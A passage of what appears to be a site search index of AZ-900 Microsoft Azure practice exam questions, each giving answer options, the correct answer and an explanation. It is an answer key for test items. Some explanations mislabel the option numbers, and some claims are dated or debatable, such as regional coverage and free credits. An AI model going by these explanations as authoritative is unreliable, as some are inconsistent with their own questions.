See:\u00a0https://azure.microsoft.com/en-us/solutions/serverless/</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-15-what-is-a-primary-benefit-of-opting-for-a-consumption-based-pricing-model-over-a-time-based-pricing-model-in-cloud-services","title":"Question 15: What is a primary benefit of opting for a consumption-based pricing model over a time-based pricing model in cloud services?","text":"<ul> <li>The ability to easily predict the future cost of the service.</li> <li>It always being cheaper to pay for consumption rather than paying hourly.</li> <li>Significant cost savings when the resources aren't needed for constant use.</li> <li>A simpler and easier-to-understand pricing model.</li> </ul> <p>Explanation: The correct answer is \"Significant cost savings when the resources aren't needed for constant use\". In a consumption-based pricing model, also known as pay-as-you-go, customers are billed only for the specific resources they use. This model provides cost-efficiency for workloads with variable usage patterns or for resources that aren't needed continuously.</p> <p>When compared to a time-based pricing model, where resources are billed on a fixed schedule regardless of actual use (for example, hourly or monthly), consumption-based pricing can result in significant cost savings if the resources are not used often or their usage fluctuates.</p> <p>While the other options can be true in certain cases, they aren't inherently beneficial aspects of the consumption-based model. The cost predictability can be challenging due to the variable nature of usage (Answer 1), it's not always cheaper (Answer 2) as it depends on the resource usage pattern, and the simplicity of the pricing model (Answer 4) depends on the specific terms and conditions of the service provider. Therefore, the most accurate and generalizable benefit is the potential for cost savings with infrequent or variable resource use. See:\u00a0https://docs.microsoft.com/en-us/azure/azure-functions/functions-consumption-costs</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-16-in-microsoft-azure-which-tool-or-service-allows-for-the-organization-and-management-of-multiple-subscriptions-within-hierarchical-structures","title":"Question 16: In Microsoft Azure, which tool or service allows for the organization and management of multiple subscriptions within hierarchical structures?","text":"<ul> <li>RBAC (Role-Based Access Control)</li> <li>Management Groups</li> <li>Azure Active Directory</li> <li>Resource Groups</li> </ul> <p>Explanation:  The correct answer is\u00a0Management Groups. In Azure, Management Groups provide a way to manage access, policies, and compliance for multiple subscriptions. They can be structured into a hierarchy for the organization's needs. All subscriptions within a Management Group automatically inherit the conditions applied to the Management Group, facilitating governance on a large scale.</p> <p>Resource Groups, on the other hand, are containers for resources deployed on Azure. They do not provide management capabilities across multiple subscriptions.</p> <p>RBAC (Role-Based Access Control)\u00a0is a system that provides fine-grained access management to Azure resources but it doesn't inherently support the organization of subscriptions into hierarchies.</p> <p>Azure Active Directory\u00a0is a service that provides identity and access management capabilities but does not provide a direct mechanism for managing multiple subscriptions in nested hierarchies.</p> <p>Hence, Management Groups is the correct answer as it directly allows for the management and organization of multiple subscriptions into nested hierarchies, which the other options do not. See:\u00a0https://docs.microsoft.com/en-us/azure/governance/management-groups/overview</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-17-which-feature-of-azure-active-directory-will-require-users-to-have-their-mobile-phone-in-order-to-be-able-to-log-in","title":"Question 17:\u00a0Which feature of Azure Active Directory will require users to have their mobile phone in order to be able to log in?","text":"<ul> <li>Azure Security Center</li> <li>Multi-Factor Authentication</li> <li>Azure Information Protection (AIP)</li> <li>Advanced Threat Protection (ATP)</li> </ul> <p>Explanation: Multi-Factor Authentication (MFA) - the concept of having something additional to a \u201cpassword\u201d that is required to log in; passwords are find-able or guessable; but having your mobile phone on you to receive a phone call, text or run an app to get a code is harder for an unknown hacker to get. See:\u00a0https://docs.microsoft.com/en-us/azure/active-directory/authentication/concept-mfa-howitworks</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-18-who-is-responsible-for-the-security-of-the-physical-servers-in-an-azure-data-center","title":"Question 18: Who is responsible for the security of the physical servers in an Azure data center?","text":"<ul> <li>Azure is responsible for securing the physical data centers</li> <li>I am responsible for securing the physical data centers</li> </ul> <p>Explanation: Azure is responsible for physical security. See:\u00a0https://docs.microsoft.com/en-us/azure/security/fundamentals/physical-security</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-19-true-or-false-azure-is-a-public-cloud-and-has-no-private-cloud-offerings","title":"Question 19:\u00a0True or False: Azure is a public cloud, and has no private cloud offerings","text":"<ul> <li>TRUE</li> <li>FALSE</li> </ul> <p>Explanation: The correct answer is FALSE. While Azure is indeed widely recognized as a public cloud provider, offering a vast array of services accessible via the internet on a multi-tenant basis, it does also provide private cloud capabilities. One notable offering is Azure Stack, an extension of Azure that allows businesses to run apps in an on-premises environment and deliver Azure services in their datacenter. With Azure Stack, you get the flexibility of using Azure\u2019s cloud capabilities while maintaining your own datacenter for privacy, regulatory compliance, or other requirements. Additionally, Azure offers services such as Azure Private Link, which provides private connectivity from a virtual network to Azure services, and Azure ExpressRoute, a service that enables a private, dedicated network connection to Azure. So, contrary to the statement, Azure does have private cloud offerings along with its public cloud, making the statement FALSE. See:\u00a0</p> <ul> <li>https://azure.microsoft.com/en-us/overview/what-is-a-private-cloud/</li> <li>https://azure.microsoft.com/en-us/global-infrastructure/government/</li> <li>https://azure.microsoft.com/en-us/overview/azure-stack/</li> </ul>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-20-who-is-responsible-for-the-security-of-your-azure-storage-account-access-keys","title":"Question 20:\u00a0Who is responsible for the security of your Azure Storage account access keys?","text":"<ul> <li>Azure is responsible for securing the access keys</li> <li>I am responsible for securing the access keys</li> </ul> <p>Explanation: Customers are responsible to secure the access keys they are given and regenerate them if they are exposed. See:\u00a0https://docs.microsoft.com/en-us/azure/storage/common/storage-account-keys-manage</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-21-which-feature-within-azure-collects-all-of-the-logs-from-various-resources-into-a-central-dashboard-where-you-can-run-queries-view-graphs-and-create-alerts-on-certain-events","title":"Question 21:\u00a0Which feature within Azure collects all of the logs from various resources into a central dashboard, where you can run queries, view graphs, and create alerts on certain events?","text":"<ul> <li>Azure Portal Dashboard</li> <li>Azure Monitor</li> <li>Azure Security Center</li> <li>Storage Account or Event Hub</li> </ul> <p>Explanation: Azure Monitor - a centralized dashboard that collects all the logs, metrics and events from your resources. See:\u00a0https://docs.microsoft.com/en-us/azure/azure-monitor/overview</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-22-when-establishing-a-site-to-site-vpn-connection-with-azure-what-kind-of-network-device-needs-to-be-present-or-installed-in-your-companys-on-premises-network-infrastructure","title":"Question 22: When establishing a Site-to-Site VPN connection with Azure, what kind of network device needs to be present or installed in your company's on-premises network infrastructure?","text":"<ul> <li>An Azure Virtual Network</li> <li>An Application Gateway</li> <li>A dedicated virtual machine</li> <li>A compatible VPN Gateway device</li> </ul> <p>Explanation: The correct answer is a compatible VPN Gateway device. In order to establish a site-to-site VPN connection with Azure, a VPN Gateway is required on your company's internal network. A VPN Gateway is a specific type of virtual network gateway that sends encrypted traffic across a public network, like the Internet. While the name might suggest it's a purely virtual entity, in practice, the term \"VPN Gateway\" often refers to a hardware device that's installed on-premises in your data center. This device uses Internet Protocol security (IPsec) to establish a secure, encrypted connection to the Azure VPN Gateway, which resides in the Azure virtual network. This setup allows your local network and Azure to interact as if they're directly connected. In contrast, virtual machines, virtual networks, and application gateways are other types of Azure resources, but they do not facilitate creating a site-to-site VPN connection. It's important to note that your company's internal network hardware and settings must meet specific requirements to support a VPN Gateway. See:\u00a0https://docs.microsoft.com/en-us/azure/vpn-gateway/vpn-gateway-howto-site-to-site-resource-manager-portal</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-23-which-of-the-following-is-something-that-azure-cognitive-services-api-can-currently-do","title":"Question 23:\u00a0Which of the following is something that Azure Cognitive Services API can currently do?","text":"<ul> <li>Translate text from one language to another</li> <li>All of these! Azure can do it all!</li> <li>Speak text in an extremely realistic way</li> <li>Create text from audio</li> <li>Recognize text in an image</li> </ul> <p>Explanation: Azure can do all of them, of course. See:\u00a0https://docs.microsoft.com/en-us/azure/cognitive-services/welcome</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-24-which-of-the-following-azure-features-is-most-likely-to-deliver-the-most-immediate-savings-when-it-comes-to-reducing-azure-costs","title":"Question 24:\u00a0Which of the following Azure features is most likely to deliver the most immediate savings when it comes to reducing Azure costs?","text":"<ul> <li>Changing your storage accounts from globally redundant (GRS) to locally redundant (LRS)</li> <li>Auto shutdown of development and QA servers over night and on weekends    </li> <li>Using Azure Reserved Instances for most of your virtual machines</li> <li>Using Azure Policy to restrict the user of expensive VM SKUs</li> </ul> <p>Explanation:  Reserved Instances often offer 40% or more savings off of the price of pay-as-you-go virtual machines. See:\u00a0https://docs.microsoft.com/en-us/azure/cost-management-billing/reservations/save-compute-costs-reservations</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-25-in-the-context-of-azures-high-availability-solutions-what-is-the-primary-purpose-of-azure-availability-zones","title":"Question 25:\u00a0In the context of Azure's high availability solutions, what is the primary purpose of Azure Availability Zones?","text":"<ul> <li>They serve as a folder structure in Azure used for organizing resources such as databases, virtual machines, and virtual networks.</li> <li>They are synonymous with an Azure region.</li> <li>They allow manual selection of data centers for virtual machine placement to achieve superior availability compared to other options.</li> <li>They represent certain server racks within individual data centers, specifically designed by Azure for higher uptime.</li> </ul> <p>Explanation:  The correct answer is: \"They allow manual selection of data centers for virtual machine placement to achieve superior availability compared to other options.\" </p> <p>Azure Availability Zones are a high availability offering that protects applications and data from datacenter failures. Each Azure region is composed of multiple datacenters, and each datacenter is essentially an Availability Zone. They are unique physical locations within a region, equipped with their own independent power, cooling, and networking. By placing your resources across different Availability Zones within a region, you can protect your apps and data from the failure of a single datacenter. If one datacenter goes down, the resources in the other datacenters (Availability Zones) can continue to operate, providing redundancy and increasing the overall availability of your applications. It's important to note that these zones are not the same as Azure regions (which are geographical areas containing one or more datacenters), nor are they equivalent to resource groups (which are logical containers for resources deployed on Azure). They are also not isolated to specific racks within a datacenter, but rather spread across different datacenters in a region, offering a broader scope of protection.  See:\u00a0https://docs.microsoft.com/en-us/azure/availability-zones/az-overview</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-26-which-of-the-following-characteristics-is-essential-for-a-system-to-be-considered-highly-available-in-a-cloud-computing-environment","title":"Question 26:\u00a0Which of the following characteristics is essential for a system to be considered highly available in a cloud computing environment?","text":"<ul> <li>The system must maintain 100% availability at all times.</li> <li>The system must be designed for resilience, with no single points of failure.</li> <li>It's impossible to create a highly available system.</li> <li>The system must operate on a minimum of two virtual machines.</li> </ul> <p>Explanation: The correct answer is \"A system specifically designed to be resilient, with no single point of failures\". High availability in a system means that it is designed to operate continuously without failure for a long period of time. This is achieved by building redundancy into the system, eliminating single points of failure, and enabling rapid recovery from any failures that do occur. In other words, even if a component of the system fails, there are other components that can take over, allowing the system to continue operating seamlessly. While high availability often aims for close to 100% uptime, the claim of maintaining 100% availability is practically unrealistic due to factors like maintenance needs and unexpected failures. Also, having a minimum of two VMs may contribute to high availability but isn't a definitive requirement \u2014 it depends on the specifics of the system architecture. Finally, the assertion that it's not possible to create a highly available system is incorrect. There are established strategies and technologies for designing and operating highly available systems, and they are widely used in mission-critical applications across many industries. See:\u00a0https://docs.microsoft.com/en-us/azure/virtual-machines/windows/availability</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-27-in-the-context-of-cloud-computing-how-is-the-benefit-of-agility-best-described","title":"Question 27: In the context of cloud computing, how is the benefit of 'agility' best described?","text":"<ul> <li>It refers to the ability to swiftly recover from a large-scale regional failure.</li> <li>It refers to the ability to quickly respond to and drive changes in the market.</li> <li>It refers to the system's ability to easily scale up when it reaches full capacity.</li> <li>It refers to the ability to rapidly provision new resources.</li> </ul> <p>Explanation:  The correct answer is \"It refers to the ability to quickly respond to and drive changes in the market\". Agility, in the context of cloud computing, refers to the ability of an organization to rapidly adapt to market and environmental changes in productive and cost-effective ways. It involves quickly adjusting and adapting strategic and operational capabilities to respond to and take advantage of changes in the business environment. The other options, while also benefits of the cloud, do not directly align with the concept of agility. Spinning up new resources quickly (Answer 2) or growing capacity easily when full (Answer 3) relate more to the cloud's scalability and elasticity. The ability to recover from a region-wide failure rapidly (Answer 4) speaks to the cloud's resilience and disaster recovery capabilities. While these aspects can contribute to overall business agility, they don't encapsulate the broader strategic meaning of agility - the capacity to quickly adjust to market changes, which can include shifts in customer demand, competitive pressures, or regulatory changes, among others. Hence, the ability to respond to and drive market change quickly is the most accurate answer. See:\u00a0https://docs.microsoft.com/en-us/azure/cloud-adoption-framework/strategy/business-outcomes/agility-outcomes</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-28-if-you-wanted-to-simply-use-azure-as-an-extension-of-your-own-datacenter-not-primarily-hosting-anything-there-but-using-it-for-extra-storage-or-taking-advantage-of-some-services-what-hosting-model-is-that-called","title":"Question 28: If you wanted to simply use Azure as an extension of your own datacenter, not primarily hosting anything there but using it for extra storage or taking advantage of some services, what hosting model is that called?","text":"<ul> <li>Public cloud</li> <li>Hybrid cloud</li> <li>Private cloud</li> </ul> <p>Explanation: The correct answer is \"Hybrid cloud.\" The scenario described in the question is a typical use case for a hybrid cloud model, which integrates private cloud or on-premises infrastructure with public cloud resources, such as those provided by Azure. In a hybrid cloud model, businesses can keep sensitive data or critical applications on their private cloud or on-premises datacenter for security and compliance reasons while using the public cloud's vast resources for additional storage, computational power, or specific services when necessary. This not only allows for greater flexibility and scalability, but also offers potential cost savings. In contrast, a purely public cloud model involves hosting all data and applications on a public cloud provider's infrastructure, and a purely private cloud model involves hosting everything on a business's own infrastructure or a rented, single-tenant infrastructure. The described scenario of extending an on-premises datacenter with Azure services fits best with the hybrid cloud model. See:\u00a0https://azure.microsoft.com/en-us/overview/what-is-hybrid-cloud-computing/</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-29-in-the-context-of-cloud-computing-a-virtual-machine-vm-is-primarily-associated-with-which-type-of-cloud-hosting-model","title":"Question 29: In the context of cloud computing, a virtual machine (VM) is primarily associated with which type of cloud hosting model?","text":"<ul> <li>Software as a Service (SaaS)</li> <li>Infrastructure as a Service (IaaS)</li> <li>Platform as a Service (PaaS)</li> </ul> <p>Explanation: The correct answer is IaaS, which stands for Infrastructure as a Service. In the context of cloud computing, a virtual machine (VM) is typically provided as part of an IaaS offering. With IaaS, the provider manages the underlying physical infrastructure (like servers, network equipment, and storage), while the consumer controls the virtualized components of the infrastructure, such as the virtual machines, their operating systems, and the applications running on them. This is contrasted with the other options. In a Platform as a Service (PaaS) model, the consumer only controls the applications and possibly some configuration settings for the application-hosting environment, but does not manage the operating system, server hardware, or network infrastructure. Similarly, in a Software as a Service (SaaS) model, the consumer only uses the software and does not control any aspect of the infrastructure or platform where the application runs. Therefore, given that a virtual machine involves control over the operating system and applications within a cloud-managed infrastructure, it aligns with the IaaS hosting model. See:\u00a0https://azure.microsoft.com/en-us/overview/what-is-iaas/</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-30-which-of-the-following-best-describes-the-primary-benefit-of-a-content-delivery-network-cdn-in-a-cloud-computing-context","title":"Question 30:\u00a0Which of the following best describes the primary benefit of a Content Delivery Network (CDN) in a cloud computing context?","text":"<ul> <li>For a nominal fee, Azure will manage your virtual machine, perform OS updates, and ensure optimal performance.</li> <li>It mitigates server load for static, unchanging files like images, videos, and PDFs by distributing them across a network of servers.</li> <li>It enables temporary session information storage for web visitors, such as their login ID or name.</li> <li>It provides fast and inexpensive data retrieval for later use.</li> </ul> <p>Explanation:  The correct answer, \"It mitigates server load for static, unchanging files\", is indeed the core benefit of a Content Delivery Network (CDN). A CDN stores copies of a website's static files on servers distributed globally. These static files could be anything that doesn't change frequently, like images, CSS, JavaScript, videos, etc. When a user visits the site, they are served these static files from the CDN server nearest to them geographically. This reduces the latency, as the data has a shorter distance to travel. Additionally, it reduces the load on the original server because the CDN handles a significant portion of the traffic. As a result, not only is the user experience improved due to faster load times, but the operational efficiency and performance of the original server are also enhanced. Therefore, CDNs are essential for sites serving large amounts of static content to a geographically dispersed user base. See:\u00a0https://docs.microsoft.com/en-us/azure/cdn/cdn-overview</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-31-what-is-the-name-of-the-group-of-services-inside-azure-that-hosts-the-apache-hadoop-big-data-analysis-tools","title":"Question 31: What is the name of the group of services inside Azure that hosts the Apache Hadoop big data analysis tools?","text":"<ul> <li>Azure Hadoop Services</li> <li>Azure Data Factory</li> <li>HDInsight</li> <li>Azure Kubernetes Services</li> </ul> <p>Explanation:  The correct answer is HDInsight. HDInsight is Microsoft Azure's offering for hosting the Apache Hadoop big data analysis tools. Apache Hadoop is an open-source software platform that supports data-intensive distributed applications. This platform enables processing large amounts of data across clusters of computers. Azure HDInsight is a cloud distribution of the Hadoop components from the Hortonworks Data Platform. It allows Azure users to process vast amounts of data with popular open-source frameworks such as Hadoop, Hive, HBase, Storm, and others. Additionally, the HDInsight service also supports R, Python, Scala, and .NET. So, it's not just limited to traditional Hadoop tools. Options like 'Azure Hadoop Services' and 'Azure Data Factory' are incorrect as Azure doesn't have a service named 'Azure Hadoop Services' and 'Azure Data Factory' is a cloud-based data integration service. 'Azure Kubernetes Services' is a service for managing containerized applications, not specifically for Hadoop. See:\u00a0https://azure.microsoft.com/en-us/services/hdinsight/</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-32-within-the-landscape-of-cloud-service-models-how-would-microsofts-outlook-365-be-best-categorized","title":"Question 32: Within the landscape of cloud service models, how would Microsoft's Outlook 365 be best categorized?","text":"<ul> <li>Infrastructure as a Service (IaaS)</li> <li>Software as a Service (SaaS)</li> <li>Platform as a Service (PaaS)</li> </ul> <p>Explanation:  The correct answer is SaaS, which stands for Software as a Service. Outlook 365, part of Microsoft's Office 365 suite, is a cloud-based service that provides access to various applications and services, including email, calendars, and contact management, which are delivered over the internet. In a SaaS model, the service provider is responsible for the infrastructure, platform, and software, and ensures their maintenance and updates. Users simply access the services via a web browser or app, without needing to worry about the underlying infrastructure, platform, or software updates. This contrasts with Infrastructure as a Service (IaaS), where the user is responsible for managing the operating systems, middleware, and applications, and Platform as a Service (PaaS), where the user manages only the applications and data. In both these models, the users have more responsibilities compared to SaaS. Since Outlook 365 is a software application delivered over the web with all underlying infrastructure and platform taken care of by Microsoft, it falls into the SaaS hosting model. See:\u00a0https://azure.microsoft.com/en-us/overview/what-is-saas/</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-33-which-major-cloud-provider-offers-the-most-international-locations-for-customers-to-provision-virtual-machines-and-other-servers","title":"Question 33:\u00a0Which major cloud provider offers the most international locations for customers to provision virtual machines and other servers?","text":"<ul> <li>Microsoft Azure</li> <li>Google Cloud Platform</li> <li>Amazon AWS</li> </ul> <p>Explanation:  Microsoft Azure offers the most extensive global coverage among major cloud providers regarding geographical regions. This allows customers to provision virtual machines, databases, and other services in various international locations closer to their user base, which can enhance performance, reduce latency, and comply with local regulations regarding data residency. While AWS (Amazon Web Services) and GCP (Google Cloud Platform) also provide many regions globally, Microsoft Azure has distinguished itself with the broadest regional availability. See:\u00a0https://azure.microsoft.com/en-us/global-infrastructure/regions/</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-34-which-azure-website-tool-is-available-for-you-to-estimate-the-future-costs-of-your-azure-products-and-services-by-adding-products-to-a-shopping-basket-and-helping-you-calculate-the-costs","title":"Question 34:\u00a0Which Azure website tool is available for you to estimate the future costs of your Azure products and services by adding products to a shopping basket and helping you calculate the costs?","text":"<ul> <li>Azure Pricing Calculator</li> <li>Microsoft Docs</li> <li>Azure Advisor</li> </ul> <p>Explanation: Azure Pricing Calculator lets you attempt to calculate your future bill based on resources you select and your estimates of usage. See:\u00a0https://azure.microsoft.com/en-us/pricing/calculator/</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-35-what-is-the-name-of-azures-hosted-sql-database-service","title":"Question 35:\u00a0What is the name of Azure's hosted SQL database service?","text":"<ul> <li>SQL Server in a VM</li> <li>Table Storage</li> <li>Cosmos DB</li> <li>Azure SQL Database</li> </ul> <p>Explanation:  SQL Database is a SQL Server compatible option in Azure, a database as a service. See:\u00a0https://docs.microsoft.com/en-us/azure/sql-database/sql-database-technical-overview</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-36-true-or-false-you-cannot-have-more-than-one-azure-subscription-per-company","title":"Question 36:\u00a0True or false: You cannot have more than one Azure subscription per company","text":"<ul> <li>TRUE</li> <li>FALSE</li> </ul> <p>Explanation:  You can have multiple subscriptions, as a way to separate out resources between billing units, business groups, or for any reason you wish. See:\u00a0https://docs.microsoft.com/en-us/azure/cloud-adoption-framework/decision-guides/subscriptions/</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-37-can-you-give-someone-else-access-to-your-azure-subscription-without-giving-them-your-user-name-and-password","title":"Question 37:\u00a0Can you give someone else access to your Azure subscription without giving them your user name and password?","text":"<ul> <li>YES</li> <li>NO</li> </ul> <p>Explanation: Yes, anyone can create their own Azure account and you can give them access to your subscription with granular control as to permissions. See:\u00a0https://docs.microsoft.com/en-us/azure/role-based-access-control/overview</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-38-true-or-false-you-can-create-your-own-policies-if-built-in-azure-policy-is-not-sufficient-to-your-needs","title":"Question 38:\u00a0True or false: you can create your own policies if built-in Azure Policy is not sufficient to your needs","text":"<ul> <li>FALSE</li> <li>TRUE</li> </ul> <p>Explanation:  True, you can create custom policies using JSON. See:\u00a0https://docs.microsoft.com/en-us/azure/governance/policy/tutorials/create-custom-policy-definition</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-39-in-the-context-of-azures-service-level-agreement-sla-for-virtual-machines-which-of-the-following-deployment-strategies-would-offer-the-highest-level-of-availability","title":"Question 39:\u00a0In the context of Azure's Service Level Agreement (SLA) for virtual machines, which of the following deployment strategies would offer the highest level of availability?","text":"<ul> <li>Deploying two or more virtual machines across different availability zones within the same region.</li> <li>Deploying two or more virtual machines within the same data center.   </li> <li>Deploying two or more virtual machines within an availability set.</li> <li>Deploying a single virtual machine.</li> </ul> <p>Explanation: The correct answer is \"Deploying two or more virtual machines across different availability zones within the same region\".</p> <p>Service Level Agreement (SLA) is a commitment by a service provider on the level of service - like uptime, performance, or other key metrics - that users can expect. Azure provides an SLA for various services, including Virtual Machines. A single VM, even with premium storage, provides a lesser SLA compared to VMs deployed in an Availability Set or across Availability Zones. While using an Availability Set (two or more VMs in the same datacenter but across fault and update domains) provides a higher SLA than a single VM, the highest SLA is provided when two or more VMs are deployed across Availability Zones in the same region. Availability Zones are unique physical locations within a region. Each zone is made up of one or more datacenters equipped with independent power, cooling, and networking. They are set up to be an isolation boundary - if one zone goes down, the other continues working. This distribution of VMs across zones provides high availability and resiliency, hence offering the highest SLA. See:\u00a0https://azure.microsoft.com/en-us/support/legal/sla/virtual-machines/v1_9/</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-40-what-is-the-basic-way-of-protecting-an-azure-virtual-network-subnet","title":"Question 40: What is the basic way of protecting an Azure Virtual Network subnet?","text":"<ul> <li>Network Security Group</li> <li>Azure DDos Standard protection</li> <li>Azure Firewall</li> <li>Application Gateway with WAF</li> </ul> <p>Explanation:  Network Security Group (NSG) - a fairly basic set of rules that you can apply to both inbound traffic and outbound traffic that lets you specify what sources, destinations, and ports are allowed to travel through from outside the virtual network to inside the virtual network. See:\u00a0https://docs.microsoft.com/en-us/azure/virtual-network/security-overview</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-41-true-or-false-formal-support-is-not-included-in-private-preview-mode","title":"Question 41:\u00a0True or false: Formal support is not included in private preview mode.","text":"<ul> <li>FALSE</li> <li>TRUE</li> </ul> <p>Explanation: True. Preview features are not fully ready and this phase does not include formal support. See:\u00a0https://azure.microsoft.com/en-us/support/legal/preview-supplemental-terms/</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-42-true-or-false-azure-has-the-responsibility-to-manage-the-hardware-in-the-infrastructure-as-a-service-model","title":"Question 42:\u00a0True or False: Azure has the responsibility to manage the hardware in the Infrastructure as a Service model","text":"<ul> <li>TRUE   </li> <li>FALSE</li> </ul> <p>Explanation:  The correct answer is TRUE. In an Infrastructure as a Service (IaaS) model, the cloud service provider, in this case Microsoft Azure, is responsible for managing the underlying physical hardware. This includes servers, storage, networking hardware, and the virtualization layer. Azure ensures that these resources are available and maintained, providing capabilities like automated backup, disaster recovery, and scaling. The customer, on the other hand, is responsible for managing the software components of the service, including the operating system, middleware, runtime, data, and applications. This arrangement allows customers to focus on their core business and application development without worrying about the physical infrastructure's procurement, management, and maintenance. It's important to remember that the division of responsibilities may change in other service models like Platform as a Service (PaaS) or Software as a Service (SaaS), where the cloud service provider manages more layers of the technology stack. But for IaaS, the provider indeed manages the hardware, making the statement TRUE. See:\u00a0https://azure.microsoft.com/en-us/overview/what-is-iaas/</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-43-what-is-single-sign-on","title":"Question 43: What is Single Sign-On?","text":"<ul> <li>When you sign in to an application, it remembers who you are the next time you go there.</li> <li>The ability to use an existing user id and password to sign in other applications, and not have to create/memorize a new one.</li> <li>When an application outsources (federates) it's identity service to a third-party platform</li> </ul> <p>Explanation:  Single Sign-On - the ability to use the same user id and password to log into every application that your company has; enabled by Azure AD. See:\u00a0https://docs.microsoft.com/en-us/azure/active-directory/manage-apps/what-is-single-sign-on</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-44-an-it-administrator-has-the-requirement-to-control-access-to-a-specific-app-resource-using-multi-factor-authentication-what-azure-service-satisfies-this-requirement","title":"Question 44:\u00a0An IT administrator has the requirement to control access to a specific app resource using multi-factor authentication. What Azure service satisfies this requirement?","text":"<ul> <li>Azure Authentication</li> <li>Azure Function</li> <li>Azure AD</li> <li>Azure Authorization</li> </ul> <p>Explanation:  You can use Azure AD to control access to your apps and your app resources, based on your business requirements. In addition, you can use Azure AD to require multi-factor authentication when accessing important organizational resources. See:\u00a0https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/active-directory-whatis#which-features-work-in-azure-ad</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-45-what-is-the-main-management-tool-used-for-managing-azure-resources-with-a-graphical-user-interface","title":"Question 45:\u00a0What is the MAIN management tool used for managing Azure resources with a graphical user interface?","text":"<ul> <li>Remote Desktop Protocol (RDP)</li> <li>PowerShell</li> <li>Azure Storage Explorer</li> <li>Azure Portal</li> </ul> <p>Explanation:  Azure Portal is the website used to manage your resources in Azure. See:\u00a0https://docs.microsoft.com/en-us/azure/azure-portal/azure-portal-overview</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-46-what-is-the-default-amount-of-credits-that-you-are-given-when-you-first-create-an-azure-free-account","title":"Question 46:\u00a0What is the default amount of credits that you are given when you first create an Azure Free account?","text":"<ul> <li>The default is US$200</li> <li>You can create 1 Linux VM, 1 Windows VM, and a number of other free services for the first year.</li> <li>You are given $50 per month, for one year towards Azure services  </li> <li>Azure does not give you any free credits when you create a free account</li> </ul> <p>Explanation: There are some other benefits to a free account, but you get US$200 to spend in the first month. See:\u00a0https://azure.microsoft.com/free</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-47-azure-services-can-go-through-several-phases-in-a-service-lifecycle-what-are-the-three-phases-called","title":"Question 47:\u00a0Azure Services can go through several phases in a Service Lifecycle. What are the three phases called?","text":"<ul> <li>Preview Phase, General Availability Phase, and Unpublished</li> <li>Private Preview, Public Preview, and General Availability</li> <li>Development phase, QA phase, and Live phase</li> <li>Announced, Coming Soon, and Live </li> </ul> <p>Explanation:  Private Preview, Public Preview, and General Availability.</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-48-what-is-azures-preferred-identityauthentication-service","title":"Question 48:\u00a0What is Azure's preferred Identity/authentication service?","text":"<ul> <li>Network Security Group</li> <li>Facebook Connect</li> <li>Live Connect</li> <li>Azure Active Directory</li> </ul> <p>Explanation:  Azure Active Directory (Azure AD) - Microsoft\u2019s preferred Identity as a Service solution. See:\u00a0https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/active-directory-whatis</p>","tags":["certification","cloud","azure","microsoft","az-900"]},{"location":"cloud/azure/az-900-exams/#question-49-which-tool-within-azure-helps-you-to-track-your-compliance-with-various-international-standards-and-government-laws","title":"Question 49:\u00a0Which tool within Azure helps you to track your compliance with various international standards and government laws?","text":"<ul> <li>Microsoft Privacy Statement</li> <li>Service Trust Portal</li> <li>Compliance Manager</li> <li>Azure Government Services</li> </ul> <p>Explanation: Compliance Manager will track your own compliance with various standards and laws. 